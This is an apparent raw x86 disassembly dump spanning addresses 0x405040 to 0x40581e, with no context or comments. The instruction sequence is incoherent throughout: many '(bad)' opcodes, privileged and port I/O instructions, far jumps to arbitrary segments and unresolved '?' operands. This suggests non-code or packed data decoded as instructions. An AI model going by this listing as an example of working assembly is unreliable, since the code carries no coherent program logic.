  405040:	rcr    DWORD PTR [eax+0x44],cl
  405043:	adc    BYTE PTR [esi],al
  405045:	div    ecx
  405047:	lahf   
  405048:	push   0x473ec51f
  40504d:	(bad)  
  40504e:	dec    esi
  40504f:	aaa    
  405050:	xor    BYTE PTR [eax],ah
  405052:	ins    DWORD PTR es:[edi],dx
  405053:	clc    
  405054:	push   ebx
  405055:	cli    
  405056:	push   ds
  405057:	lock xchg ecx,eax
  405059:	inc    esi
  40505a:	or     BYTE PTR [edi+0x5a],ah
  40505d:	pop    esi
  40505e:	cmp    eax,0x1a
  405061:	adc    DWORD PTR [edx-0x57],0x99ea222f
  405068:	xor    DWORD PTR [ebx],ebx
  40506a:	sub    bh,ch
  40506c:	adc    eax,0x838b7fc7
  405071:	les    edi,FWORD PTR [ebx+eiz*1]
  405074:	repz test DWORD PTR [edx+0x3f9da1d0],ebx
  40507b:	mov    ds,WORD PTR [eax-0x6e33a9e6]
  405081:	or     DWORD PTR [di],edi
  405084:	sub    esi,DWORD PTR [esi]
  405086:	pop    ss
  405087:	mov    ah,0xea
  405089:	mov    esi,0x96ba0bdb
  40508e:	int3   
  40508f:	mov    bl,BYTE PTR [ecx]
  405091:	mov    edi,DWORD PTR [ebx]
  405093:	stos   BYTE PTR es:[edi],al
  405094:	xchg   edx,eax
  405095:	inc    ecx
  405096:	or     DWORD PTR [ebx],0x40
  405099:	pop    ds
  40509a:	loopne 0x405118
  40509c:	pop    edi
  40509d:	pusha  
  40509e:	adc    ebp,ecx
  4050a0:	outs   dx,BYTE PTR ds:[esi]
  4050a1:	fnstcw WORD PTR [esi+edx*1+0x6f52d231]
  4050a8:	into   
  4050a9:	stc    
  4050aa:	fnsave [edx]
  4050ac:	sub    DWORD PTR [ebx-0x1a],ebp
  4050af:	(bad)  
  4050b0:	in     eax,0x86
  4050b2:	aaa    
  4050b3:	push   ss
  4050b4:	aad    0x34
  4050b6:	pop    ecx
  4050b7:	ret    0x5aac
  4050ba:	or     edx,DWORD PTR [ebp+esi*8-0x3e]
  4050be:	or     esi,DWORD PTR [ebx-0x37]
  4050c1:	xor    BYTE PTR [ecx],bh
  4050c3:	aam    0xa7
  4050c5:	das    
  4050c6:	out    0x6d,eax
  4050c8:	clc    
  4050c9:	daa    
  4050ca:	xchg   ecx,eax
  4050cb:	cmp    al,0xb3
  4050cd:	mov    al,BYTE PTR [edx]
  4050cf:	stos   DWORD PTR es:[edi],eax
  4050d0:	xchg   edx,eax
  4050d1:	xor    eax,0x1f73de1
  4050d6:	sub    eax,0x65d4c
  4050db:	mov    cs,WORD PTR [edx-0x2225e3b3]
  4050e1:	mov    al,ds:0x36df7b90
  4050e6:	(bad)  
  4050e7:	(bad)  
  4050e8:	(bad)  
  4050e9:	call   0xe4fffb89
  4050ee:	or     eax,0x264a314b
  4050f3:	sbb    al,0xa0
  4050f5:	sbb    al,0xcb
  4050f7:	cmp    eax,0xc4de849e
  4050fc:	fadd   QWORD PTR [esp+esi*2]
  4050ff:	mov    cl,0xe7
  405101:	gs ja  0x4050fb
  405104:	popf   
  405105:	(bad)  
  405106:	popa   
  405107:	out    dx,al
  405108:	mov    esi,0x8ed8ce19
  40510d:	mov    ds:0x3fd80f03,eax
  405112:	dec    eax
  405113:	icebp  
  405114:	stc    
  405115:	jle    0x4050a7
  405117:	fdivr  QWORD PTR ss:[edi-0x721f2410]
  40511e:	add    eax,DWORD PTR [edx+0x42]
  405121:	mov    ecx,0x117b8274
  405126:	adc    al,0x67
  405128:	pop    ebp
  405129:	into   
  40512a:	loopne 0x405178
  40512c:	mov    ebp,0x415b7a63
  405131:	push   0x5e159315
  405136:	jne    0x40517b
  405138:	clc    
  405139:	ins    DWORD PTR es:[edi],dx
  40513a:	loop   0x40515c
  40513c:	rol    DWORD PTR [edi+edx*2],cl
  40513f:	lods   al,BYTE PTR ds:[esi]
  405140:	ret    0x2dac
  405143:	fucomip st,st(6)
  405145:	jmp    0x405143
  405147:	popf   
  405148:	call   0x40f2:0x50b60a2d
  40514f:	mov    esi,0xb20089af
  405154:	adc    DWORD PTR [esi],0xffffffe2
  405157:	icebp  
  405158:	inc    edx
  405159:	test   eax,0x67f085ca
  40515e:	or     eax,edx
  405160:	dec    edx
  405161:	retf   0x9c0a
  405164:	xchg   edi,eax
  405165:	call   0x469a41a0
  40516a:	push   ecx
  40516b:	and    ebx,ecx
  40516d:	mov    eax,DWORD PTR [eax]
  40516f:	std    
  405170:	mov    BYTE PTR [ebx],bh
  405172:	call   0x80096ad8
  405177:	sbb    DWORD PTR [edi-0x61],eax
  40517a:	push   ebp
  40517b:	push   edi
  40517c:	cli    
  40517d:	sub    edi,esi
  40517f:	dec    ebp
  405180:	and    esi,ecx
  405182:	test   eax,0x176d3633
  405187:	out    0xc8,al
  405189:	sbb    dh,al
  40518b:	lds    esi,FWORD PTR [edi+ecx*4+0x11]
  40518f:	leave  
  405190:	jp     0x4051b6
  405192:	jp     0x4051a5
  405194:	xchg   edi,eax
  405195:	ja     0x4051a1
  405197:	jo     0x405158
  405199:	out    dx,al
  40519a:	mov    ds:0x66ecd278,eax
  40519f:	xchg   ebx,eax
  4051a0:	sub    eax,edx
  4051a2:	pusha  
  4051a3:	stos   DWORD PTR es:[edi],eax
  4051a4:	loopne 0x4051ee
  4051a6:	and    DWORD PTR [ecx-0x119b2dfc],edx
  4051ac:	xchg   esp,eax
  4051ad:	daa    
  4051ae:	push   ebx
  4051af:	mov    esp,0x6e859286
  4051b4:	or     dl,BYTE PTR ds:0x54264c72
  4051ba:	xlat   BYTE PTR ds:[ebx]
  4051bb:	enter  0xb5ee,0xa
  4051bf:	xchg   DWORD PTR [edi+0x595ed67f],eax
  4051c5:	cs out 0xc2,al
  4051c8:	addr16 retf 
  4051ca:	retf   0xbd05
  4051cd:	mov    edx,0xcf344d2f
  4051d2:	out    dx,al
  4051d3:	mov    bh,0xf0
  4051d5:	lods   al,BYTE PTR ds:[esi]
  4051d6:	jp     0x4051e0
  4051d8:	and    DWORD PTR [edx],0x44
  4051db:	arpl   WORD PTR [edi],bx
  4051dd:	mov    eax,0xacc57e92
  4051e2:	xchg   esi,eax
  4051e3:	mov    BYTE PTR [esi],bl
  4051e5:	mov    ah,0x5d
  4051e7:	pop    edi
  4051e8:	daa    
  4051e9:	fist   DWORD PTR [edi+0x72fc79cc]
  4051ef:	lods   eax,DWORD PTR ds:[esi]
  4051f0:	aas    
  4051f1:	aaa    
  4051f2:	xchg   BYTE PTR [ebx-0x36],dh
  4051f5:	add    bh,BYTE PTR [edi]
  4051f7:	sbb    BYTE PTR [esi-0x63],dh
  4051fa:	mov    bl,0x84
  4051fc:	cwd    
  4051fe:	mov    esp,0x87961e5c
  405203:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405204:	ja     0x405233
  405206:	inc    eax
  405207:	sub    DWORD PTR [ebx],eax
  405209:	push   esp
  40520a:	cmp    dh,bl
  40520c:	add    eax,0xe287fe74
  405211:	cli    
  405212:	aad    0x39
  405214:	cmp    al,0xf5
  405216:	cli    
  405217:	xchg   dx,ax
  405219:	test   eax,0x8bba8f20
  40521e:	add    eax,esp
  405220:	jg     0x40528e
  405222:	mov    fs,WORD PTR [ecx+0xa]
  405225:	or     BYTE PTR [ebp+0x137ca0d9],bl
  40522b:	fstp   QWORD PTR [edx]
  40522d:	das    
  40522e:	jmp    0xd5fd05ab
  405233:	bound  ebx,QWORD PTR [edi+0x0]
  405236:	stos   BYTE PTR es:[edi],al
  405237:	rcl    bl,1
  405239:	push   ss
  40523a:	pop    ebx
  40523b:	das    
  40523c:	cmp    ebx,edx
  40523e:	jl     0x40528d
  405240:	call   0x8961:0x910382f5
  405247:	hlt    
  405248:	mov    al,ds:0xeaceb79b
  40524d:	mov    WORD PTR [ecx],?
  40524f:	jno    0x40521d
  405251:	cmp    eax,0xf5422f7d
  405256:	inc    edx
  405257:	retf   0x574c
  40525a:	repnz test eax,0x15a2b320
  405260:	xor    al,0x1d
  405262:	dec    eax
  405263:	aas    
  405264:	xchg   BYTE PTR [esi+0x62d4310d],dl
  40526a:	(bad)  
  40526b:	mov    esp,0x9d6b866
  405270:	and    al,al
  405272:	inc    edi
  405273:	jo     0x405249
  405275:	jne    0x405253
  405277:	inc    esp
  405278:	inc    edx
  405279:	push   cs
  40527a:	scas   al,BYTE PTR es:[edi]
  40527b:	int    0x81
  40527d:	mov    eax,ds:0xa135f0db
  405282:	jge    0x40520c
  405284:	dec    esp
  405285:	jg     0x4052d2
  405287:	inc    esi
  405288:	or     eax,0xe173d0bd
  40528d:	jle    0x4052ad
  40528f:	and    dh,bh
  405291:	bnd jbe 0x4052b4
  405294:	test   BYTE PTR [edi-0x5a0d9eb1],ah
  40529a:	fimul  WORD PTR [ecx-0x6877e33b]
  4052a0:	or     eax,0x2cb5de84
  4052a5:	xor    ebx,esi
  4052a7:	pop    es
  4052a8:	mov    bh,0x33
  4052aa:	or     ecx,DWORD PTR [edx-0x4977e271]
  4052b0:	and    BYTE PTR [esi+0x43],al
  4052b3:	popf   
  4052b4:	dec    esi
  4052b5:	aad    0x5a
  4052b7:	stos   DWORD PTR es:[edi],eax
  4052b8:	dec    ebp
  4052b9:	mov    ebp,ss
  4052bb:	pop    ebx
  4052bc:	iret   
  4052bd:	add    edi,DWORD PTR [ebx+0x66957811]
  4052c3:	lds    ebp,FWORD PTR [esi+edx*1]
  4052c6:	stos   BYTE PTR es:[edi],al
  4052c7:	cmp    DWORD PTR [edx+0x15ab3430],ebx
  4052cd:	mov    esi,0x7f0b7f2d
  4052d2:	mov    ebx,0x5cccec19
  4052d7:	xchg   edi,eax
  4052d8:	mov    al,ds:0xecfdd7ed
  4052dd:	out    dx,al
  4052de:	xchg   ebx,eax
  4052df:	mov    cl,0xce
  4052e1:	sub    ebp,eax
  4052e3:	fwait
  4052e4:	sbb    al,0x37
  4052e6:	dec    esp
  4052e7:	lea    esp,[edi-0x3a6ad26d]
  4052ed:	fs dec ebx
  4052ef:	cmp    eax,DWORD PTR [ebx+0x58cc254b]
  4052f5:	(bad)  
  4052f6:	out    0xaf,al
  4052f8:	loopne 0x40530b
  4052fa:	fwait
  4052fb:	sahf   
  4052fc:	push   ebp
  4052fd:	data16 int 0xb9
  405300:	aaa    
  405301:	outs   dx,BYTE PTR ds:[esi]
  405302:	pop    ss
  405303:	cdq    
  405304:	xchg   edx,eax
  405305:	stos   BYTE PTR es:[edi],al
  405306:	cld    
  405307:	lgs    esi,FWORD PTR [edi-0x11]
  40530b:	cli    
  40530c:	in     eax,0x3c
  40530e:	test   eax,0xd9c6e0ca
  405313:	dec    ecx
  405314:	dec    ebx
  405315:	mov    edx,0x7c6286f0
  40531a:	pop    esi
  40531b:	push   0x67975208
  405320:	call   0xad5336c4
  405325:	mov    gs,WORD PTR [eax+0x33822ddf]
  40532b:	pop    ds
  40532c:	add    edx,ecx
  40532e:	loop   0x4052b5
  405330:	(bad)  
  405331:	dec    edi
  405332:	(bad)  
  405333:	ds push eax
  405335:	int    0x5f
  405337:	(bad)  
  405338:	cld    
  405339:	jmp    0x95128192
  40533e:	test   eax,0x8419d9d6
  405343:	ja     0x40537c
  405345:	imul   eax,DWORD PTR [ecx],0xffffffab
  405348:	aas    
  405349:	inc    edi
  40534a:	cmp    eax,0x42f8be50
  40534f:	out    dx,al
  405350:	arpl   ax,ax
  405352:	imul   ebx,DWORD PTR [ebp+0x20],0xffffffbe
  405356:	jmp    0x73c4:0xac731574
  40535d:	pusha  
  40535e:	pop    ebx
  40535f:	(bad)  
  405360:	pop    eax
  405361:	repnz mov es,WORD PTR [di]
  405365:	(bad)  
  405366:	int3   
  405367:	xor    DWORD PTR [eax+0x70],ecx
  40536a:	pop    edx
  40536b:	pushf  
  40536c:	xchg   ecx,eax
  40536d:	fs mov cl,0xcb
  405370:	sbb    BYTE PTR [ebx-0x1691c89f],ch
  405376:	in     al,0x15
  405378:	mov    esp,DWORD PTR ds:0x3297478c
  40537e:	jne    0x4053cc
  405380:	and    bh,BYTE PTR [esi-0x62]
  405383:	adc    ah,bh
  405385:	out    dx,al
  405386:	inc    esp
  405387:	xor    al,0x3c
  405389:	sub    eax,0xb63d2114
  40538e:	pop    esp
  40538f:	sub    DWORD PTR [edi+0x5833b4d0],ecx
  405395:	test   al,0xfa
  405397:	ds sti 
  405399:	jp     0x405331
  40539b:	ret    
  40539c:	adc    dl,bl
  40539e:	stos   DWORD PTR es:[edi],eax
  40539f:	out    0xfd,eax
  4053a1:	bound  edx,QWORD PTR [eax+0x62]
  4053a4:	(bad)  
  4053a5:	adc    eax,ebx
  4053a7:	loop   0x4053dc
  4053a9:	dec    esp
  4053aa:	or     DWORD PTR [ebx],esp
  4053ac:	jmp    0x405386
  4053ae:	aaa    
  4053af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053b0:	adc    eax,DWORD PTR [eax]
  4053b2:	(bad)  
  4053b3:	aaa    
  4053b4:	mov    al,0x85
  4053b6:	adc    ebp,0xfbdd126d
  4053bc:	in     al,0x2f
  4053be:	mov    eax,0x5bda0879
  4053c3:	adc    ecx,esp
  4053c5:	mov    dl,0xf7
  4053c7:	cmp    al,BYTE PTR [eax+0x436ebe86]
  4053cd:	mov    ecx,0x554a0fd8
  4053d2:	outs   dx,DWORD PTR ds:[esi]
  4053d3:	mov    edi,0xd33b1d87
  4053d8:	jmp    FWORD PTR [edi]
  4053da:	(bad)  
  4053db:	dec    edi
  4053dc:	(bad)  
  4053dd:	mov    ah,0x2e
  4053df:	push   ds
  4053e0:	call   0xba94cb34
  4053e5:	pop    eax
  4053e6:	xor    DWORD PTR [edx+0x3f],esp
  4053e9:	push   esi
  4053ea:	mov    ah,0x18
  4053ec:	cmp    al,0x9
  4053ee:	dec    ecx
  4053ef:	int    0x44
  4053f1:	rcr    BYTE PTR [eax],0x6f
  4053f4:	outs   dx,DWORD PTR ds:[esi]
  4053f5:	in     eax,dx
  4053f6:	jne    0x40542a
  4053f8:	or     esp,esp
  4053fa:	mov    ch,0x8c
  4053fc:	cmp    dl,cl
  4053fe:	inc    esi
  4053ff:	cmp    BYTE PTR ds:0x62841f69,bh
  405405:	dec    eax
  405406:	in     al,dx
  405407:	cs loopne 0x405390
  40540a:	cwde   
  40540b:	adc    BYTE PTR [ecx-0x47],bh
  40540e:	test   eax,0x509480c7
  405413:	stos   BYTE PTR es:[edi],al
  405414:	rcl    DWORD PTR [edi-0x78],0xe2
  405418:	out    dx,eax
  405419:	cmp    DWORD PTR [ebx],edi
  40541b:	and    dl,BYTE PTR [esi-0x4a]
  40541e:	(bad)  
  405420:	or     ah,ah
  405422:	adc    BYTE PTR ds:0xf5079a95,dl
  405428:	mov    ah,0xb8
  40542a:	pop    ebp
  40542b:	outs   dx,BYTE PTR ds:[esi]
  40542c:	mov    dl,BYTE PTR [edi]
  40542e:	adc    al,BYTE PTR [edi+ecx*4-0x294fb709]
  405435:	or     dl,BYTE PTR [edi-0x594db143]
  40543b:	out    dx,al
  40543c:	popf   
  40543d:	inc    esi
  40543e:	mov    edx,0x27f2db5e
  405443:	jo     0x4053df
  405445:	jecxz  0x405490
  405447:	mov    WORD PTR [edx],?
  405449:	inc    ebp
  40544a:	add    BYTE PTR [eax],bl
  40544c:	ds imul ecx,esp,0x46
  405450:	int3   
  405451:	xor    BYTE PTR [edx],dh
  405453:	js     0x40542c
  405455:	out    dx,al
  405456:	pop    esi
  405457:	popa   
  405458:	fmul   DWORD PTR [ebp-0x2c3df718]
  40545e:	or     bl,cl
  405460:	cdq    
  405461:	fst    st(0)
  405463:	mov    al,0xb7
  405465:	shl    BYTE PTR [eax+0x2a602e04],0xb9
  40546c:	add    eax,0xbfce30a8
  405471:	sbb    DWORD PTR [ebx+0x4a9e1410],0xffffffea
  405478:	push   ebx
  405479:	int    0x16
  40547b:	mov    bl,0xec
  40547d:	jne    0x4054cf
  40547f:	dec    ebx
  405480:	adc    al,0x3d
  405482:	jle    0x405464
  405484:	leave  
  405485:	repz clc 
  405487:	jbe    0x405425
  405489:	xchg   ebx,eax
  40548a:	out    dx,al
  40548b:	jle    0x405422
  40548d:	mov    edi,0x1e38fa6d
  405492:	sub    al,0x4b
  405494:	(bad)  
  405495:	fild   WORD PTR [edi+0x379f3359]
  40549b:	lods   eax,DWORD PTR ds:[esi]
  40549c:	scas   al,BYTE PTR es:[edi]
  40549d:	mov    ds:0x53152f74,al
  4054a2:	pop    edx
  4054a3:	out    dx,al
  4054a4:	pushf  
  4054a5:	or     BYTE PTR [ecx],bl
  4054a7:	add    BYTE PTR ds:0x4be8dbe2,bl
  4054ad:	mov    cl,0xb7
  4054af:	les    edi,FWORD PTR [ebp-0x69fbbd3c]
  4054b5:	mov    ebp,cs
  4054b7:	mov    BYTE PTR [esi+0x42fff3ba],al
  4054bd:	fs pop eax
  4054bf:	cmp    DWORD PTR [edi],0xffffffa4
  4054c2:	xor    BYTE PTR [ebp+0x46],dl
  4054c5:	rcl    dl,1
  4054c7:	stc    
  4054c8:	out    dx,al
  4054c9:	mov    al,0x44
  4054cb:	fucomip st,st(2)
  4054cd:	push   ebp
  4054ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054cf:	jmp    0x39a1:0x2d6a46f6
  4054d6:	pushf  
  4054d7:	and    DWORD PTR [edi+0x40],esp
  4054da:	mov    WORD PTR [ebx],?
  4054dc:	dec    ebp
  4054dd:	jl     0x4054ab
  4054df:	sti    
  4054e0:	inc    eax
  4054e1:	jecxz  0x405489
  4054e3:	mov    edx,DWORD PTR [edi+0x12]
  4054e6:	retf   
  4054e7:	xor    BYTE PTR [eax],ch
  4054e9:	xor    ebp,ebp
  4054eb:	mov    edx,0xdee09322
  4054f0:	in     eax,0x87
  4054f2:	pop    es
  4054f3:	sub    bl,BYTE PTR [ebx]
  4054f5:	jge    0x405517
  4054f7:	cmp    edi,DWORD PTR [eax]
  4054f9:	xchg   ecx,eax
  4054fa:	and    BYTE PTR [ebp-0x2],dl
  4054fd:	mov    esi,0xe59effc6
  405502:	out    dx,eax
  405503:	sub    edi,DWORD PTR [ebx]
  405505:	data16 add BYTE PTR [edx+ecx*8-0x74],0x38
  40550b:	iret   
  40550c:	mov    al,ds:0x98f9fff0
  405511:	push   cs
  405512:	sti    
  405513:	mov    ebp,0xe147809d
  405518:	dec    esi
  405519:	iret   
  40551a:	dec    edx
  40551b:	fs dec ecx
  40551d:	stos   DWORD PTR es:[edi],eax
  40551e:	arpl   WORD PTR ds:0x1bf5206b,sp
  405524:	sti    
  405525:	sbb    edx,eax
  405527:	adc    al,0x71
  405529:	mov    es,ebp
  40552b:	fwait
  40552c:	inc    esp
  40552d:	imul   cl
  40552f:	inc    esp
  405530:	ret    0x79e1
  405533:	ret    0x8bac
  405536:	jmp    0xac5a:0xe62b3d2a
  40553d:	fdivr  DWORD PTR [ecx+0x3d]
  405540:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405541:	push   esi
  405542:	push   edi
  405543:	repnz push edi
  405545:	js     0x40557c
  405547:	mov    esp,0xd271a9b
  40554c:	sbb    DWORD PTR [ebx+edi*2],0xffffffc3
  405550:	arpl   WORD PTR [ebp-0x5ff7cade],sp
  405556:	add    eax,0x33153e08
  40555b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40555c:	ror    BYTE PTR [edi],cl
  40555e:	and    eax,DWORD PTR [edi]
  405560:	dec    ebp
  405561:	or     DWORD PTR [ebx-0x4f],esp
  405564:	lock inc esi
  405566:	xchg   ecx,eax
  405567:	mov    es,WORD PTR [ecx]
  405569:	xchg   edx,eax
  40556a:	xchg   esi,edx
  40556c:	rol    DWORD PTR [eax-0x24010e4e],1
  405572:	xor    DWORD PTR [ebp+ecx*1+0x32],edx
  405576:	fscale 
  405578:	int3   
  405579:	sub    dh,bl
  40557b:	pushf  
  40557c:	jp     0x405592
  40557e:	sti    
  40557f:	mov    dl,0x2a
  405581:	mov    edi,0x168899ee
  405586:	add    ah,BYTE PTR [ecx-0x503d42df]
  40558c:	mov    cl,0x4a
  40558e:	(bad)  
  40558f:	out    0x30,eax
  405591:	push   cs
  405592:	les    ebx,FWORD PTR [ebp-0x25]
  405595:	(bad)  
  405597:	pusha  
  405598:	jecxz  0x40555e
  40559a:	popa   
  40559b:	mov    cl,0xd4
  40559d:	dec    edx
  40559e:	repz stc 
  4055a0:	cs sar bl,1
  4055a3:	arpl   dx,cx
  4055a5:	ins    DWORD PTR es:[edi],dx
  4055a6:	sar    BYTE PTR [ebp-0x4b],0x1c
  4055aa:	leave  
  4055ab:	addr16 js 0x4055e6
  4055ae:	add    cl,BYTE PTR [esi+0x308462ea]
  4055b4:	not    BYTE PTR [ebx]
  4055b6:	adc    ecx,ecx
  4055b8:	xor    dl,bh
  4055ba:	pop    esi
  4055bb:	mov    ch,0x60
  4055bd:	jecxz  0x40562b
  4055bf:	call   0xbb2f:0xa8bd796d
  4055c6:	pop    eax
  4055c7:	xchg   edi,eax
  4055c8:	outs   dx,DWORD PTR ds:[esi]
  4055c9:	ret    
  4055ca:	sub    al,0xc1
  4055cc:	pusha  
  4055cd:	rcr    DWORD PTR [esi],1
  4055cf:	inc    edx
  4055d0:	jg     0x4055af
  4055d2:	mov    bh,0x26
  4055d4:	push   ss
  4055d5:	pop    es
  4055d6:	xchg   ebp,eax
  4055d7:	mov    eax,0x93437ba0
  4055dc:	loopne 0x405618
  4055de:	fwait
  4055df:	pusha  
  4055e0:	push   ebp
  4055e1:	daa    
  4055e2:	push   ss
  4055e3:	dec    eax
  4055e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055e5:	adc    ah,BYTE PTR [ebp-0x24]
  4055e8:	outs   dx,DWORD PTR ds:[esi]
  4055e9:	xor    BYTE PTR [edx+0x7f1736bb],al
  4055ef:	in     eax,dx
  4055f0:	push   edx
  4055f1:	mov    al,ds:0x7b755e9
  4055f6:	and    dh,BYTE PTR [edi+0x3a]
  4055f9:	(bad)  
  4055fa:	xor    BYTE PTR [eax],cl
  4055fc:	add    dl,0xa0
  4055ff:	ins    DWORD PTR es:[edi],dx
  405600:	xchg   ch,bl
  405602:	in     al,0x3b
  405604:	ret    0x5b6d
  405607:	sbb    DWORD PTR [edx+0x4db2f9fb],eax
  40560d:	adc    ebx,DWORD PTR [edi-0x503174d8]
  405613:	add    cl,bl
  405615:	retf   0xca3c
  405618:	inc    ecx
  405619:	dec    ecx
  40561a:	adc    al,0xe7
  40561c:	rcl    DWORD PTR [ebx],1
  40561e:	(bad)  [eax]
  405620:	jge    0x4055de
  405622:	cmc    
  405623:	push   eax
  405624:	xchg   BYTE PTR [edi],cl
  405626:	test   dh,0x40
  405629:	xchg   esp,eax
  40562a:	mov    ecx,0x7c943a62
  40562f:	or     ah,BYTE PTR [ebp+0x2e821829]
  405635:	jb     0x4055c4
  405637:	push   esp
  405638:	sbb    bh,BYTE PTR [ebx]
  40563a:	rol    DWORD PTR [edi],0x9d
  40563d:	rcr    BYTE PTR [edi-0x22],0x58
  405641:	(bad)  
  405642:	scas   eax,DWORD PTR es:[edi]
  405643:	(bad)  
  405644:	fwait
  405645:	lods   al,BYTE PTR ds:[esi]
  405646:	fwait
  405647:	test   eax,0x70fad8d6
  40564c:	ins    DWORD PTR es:[edi],dx
  40564d:	test   DWORD PTR [ebp+0x4d295bd3],esp
  405653:	inc    edx
  405654:	test   al,0x4c
  405656:	pop    ss
  405657:	sti    
  405658:	xchg   cl,ah
  40565a:	push   ds
  40565b:	push   edx
  40565c:	mov    ?,WORD PTR [ebp+esi*4-0x1]
  405660:	mov    ch,0xd3
  405662:	icebp  
  405663:	xor    esi,DWORD PTR [ebx+0x53]
  405666:	xor    BYTE PTR [ebx+0x14],0xc4
  40566a:	je     0x405673
  40566c:	out    dx,eax
  40566d:	sar    DWORD PTR [edx-0xabb4af4],1
  405673:	call   0xe58d9ff7
  405678:	fmul   DWORD PTR [ebx+0x7abc970b]
  40567e:	or     ah,al
  405680:	leave  
  405681:	sub    esi,DWORD PTR [edx+ebx*2]
  405684:	adc    eax,0x18b339a5
  405689:	jo     0x40567d
  40568b:	lea    edx,ds:0x3e39eab5
  405691:	push   ebx
  405692:	adc    eax,0xe16d93bf
  405697:	add    al,0x65
  405699:	dec    ebp
  40569a:	mov    ebp,0x4eebdfe2
  40569f:	or     esp,DWORD PTR [edx-0x4]
  4056a2:	jge    0x40568c
  4056a4:	xchg   esi,edx
  4056a6:	ins    DWORD PTR es:[edi],dx
  4056a7:	adc    cl,BYTE PTR [eax-0x10de71f6]
  4056ad:	jp     0x4056be
  4056af:	idiv   ebp
  4056b1:	add    DWORD PTR [ebx-0x40],ebx
  4056b4:	cmc    
  4056b5:	jmp    0x7270:0xcd7ce0ef
  4056bc:	fdivr  QWORD PTR [eax+0x559e174]
  4056c2:	lds    ebp,FWORD PTR [ebx]
  4056c4:	inc    edi
  4056c5:	inc    ecx
  4056c6:	pop    esp
  4056c7:	pop    ds
  4056c8:	lock jno 0x40566e
  4056cb:	enter  0x8832,0xd
  4056cf:	xor    DWORD PTR [ebx-0x2d73459f],esp
  4056d5:	pop    edx
  4056d6:	sub    eax,0x6ef60ef5
  4056db:	sbb    al,0xab
  4056dd:	loopne 0x405719
  4056df:	in     eax,dx
  4056e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056e1:	jecxz  0x4056de
  4056e3:	cmp    BYTE PTR [eax+0x55558c4],cl
  4056e9:	mov    DWORD PTR [edx+0x31],ebp
  4056ec:	out    0x0,eax
  4056ee:	jmp    0x41b99648
  4056f3:	aas    
  4056f4:	loop   0x40572c
  4056f6:	int3   
  4056f7:	sub    DWORD PTR [ebx+0x2dae9791],ebx
  4056fd:	pushf  
  4056fe:	test   BYTE PTR [ebx+0x15],ah
  405701:	xchg   DWORD PTR ds:0x1e2278b3,ebp
  405707:	or     eax,0x9f06286e
  40570c:	dec    ebp
  40570d:	test   DWORD PTR [ecx-0x281c1ff3],0x65457950
  405717:	dec    edi
  405718:	add    ah,BYTE PTR [ecx]
  40571a:	xchg   ebp,eax
  40571b:	xlat   BYTE PTR ds:[ebx]
  40571c:	rcr    DWORD PTR [eax],cl
  40571e:	jne    0x4056d4
  405720:	xchg   esi,eax
  405721:	dec    eax
  405722:	jl     0x4056ce
  405724:	adc    eax,0xce8d6739
  405729:	or     eax,0x20ba62b7
  40572e:	pop    esp
  40572f:	(bad)  
  405730:	imul   edi,esi,0x3c16c8cb
  405736:	xor    ecx,edx
  405738:	sub    dl,BYTE PTR [edx-0x43babc48]
  40573e:	test   eax,0x74b34f5a
  405743:	aam    0x1e
  405745:	pusha  
  405746:	pop    eax
  405747:	xchg   ecx,eax
  405748:	mov    dh,0x8b
  40574a:	lock sbb DWORD PTR [ecx-0x98d828e],0x55
  405752:	aaa    
  405753:	pop    ecx
  405754:	add    DWORD PTR [eax+0x1cfbc118],ecx
  40575a:	add    eax,0xfbe4fb29
  40575f:	mov    ds:0x6bb2124b,eax
  405764:	jno    0x405789
  405766:	adc    bh,dh
  405768:	fisubr DWORD PTR [edi+0x15]
  40576b:	pop    DWORD PTR [edi+0x61642819]
  405771:	jns    0x40572a
  405773:	(bad)  
  405774:	mov    eax,0x9675fbb1
  405779:	and    ah,BYTE PTR [eax]
  40577b:	aaa    
  40577c:	xchg   DWORD PTR [edx+0x6b],esi
  40577f:	add    ecx,DWORD PTR [edi]
  405781:	shl    DWORD PTR [esi-0x70],cl
  405784:	ja     0x405770
  405786:	shl    DWORD PTR [edi-0x27],cl
  405789:	pusha  
  40578a:	clc    
  40578b:	mov    ecx,0x7e2424af
  405790:	in     eax,0x3b
  405792:	mov    ebp,0xfb8d05d
  405797:	jmp    0x9b9f0525
  40579c:	dec    ebp
  40579d:	or     BYTE PTR [ebp+0x7a47d4fe],ah
  4057a3:	jbe    0x4057de
  4057a5:	push   es
  4057a6:	fwait
  4057a7:	pop    esi
  4057a8:	sub    al,0x6c
  4057aa:	mov    dl,0xa0
  4057ac:	cmp    bh,BYTE PTR [edx-0x761a5b1f]
  4057b2:	fld    QWORD PTR [ebx]
  4057b4:	mov    esi,0x7fd4797e
  4057b9:	dec    edx
  4057ba:	add    BYTE PTR [eax],ah
  4057bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057bd:	shl    BYTE PTR [ebp-0x19623d87],0x5d
  4057c4:	inc    edx
  4057c5:	(bad)  
  4057c6:	jle    0x405819
  4057c8:	xor    bh,dl
  4057ca:	lock jae 0x4057bd
  4057cd:	cmp    DWORD PTR [edx-0x24],ebp
  4057d0:	xchg   esp,eax
  4057d1:	mov    ds:0xd0844ba5,al
  4057d6:	jge    0x40580e
  4057d8:	(bad)  [eax+ebx*4+0x2044b4d4]
  4057df:	popa   
  4057e0:	loope  0x405806
  4057e2:	sti    
  4057e3:	pop    ds
  4057e4:	dec    edi
  4057e5:	cmp    al,0x3d
  4057e7:	jmp    FWORD PTR [eax]
  4057e9:	fcmovb st,st(4)
  4057eb:	mov    al,ds:0xf613017b
  4057f0:	inc    esp
  4057f1:	lds    edx,FWORD PTR ds:0xf5b2aa1d
  4057f7:	push   ebx
  4057f8:	jo     0x4057a0
  4057fa:	int3   
  4057fb:	ds mov ebx,0xe3fd43e5
  405801:	sbb    BYTE PTR [ebx-0x2f],bl
  405804:	ss (bad) 
  405806:	daa    
  405807:	inc    ecx
  405808:	mov    cl,0x6c
  40580a:	outs   dx,DWORD PTR ds:[esi]
  40580b:	mov    edx,DWORD PTR [ebp-0x378998c5]
  405811:	sbb    DWORD PTR [edi-0x6f847d15],edi
  405817:	repz hlt 
  405819:	fbld   TBYTE PTR [esi-0x37]
  40581c:	mov    bh,0xa3
  40581e:	push   ds
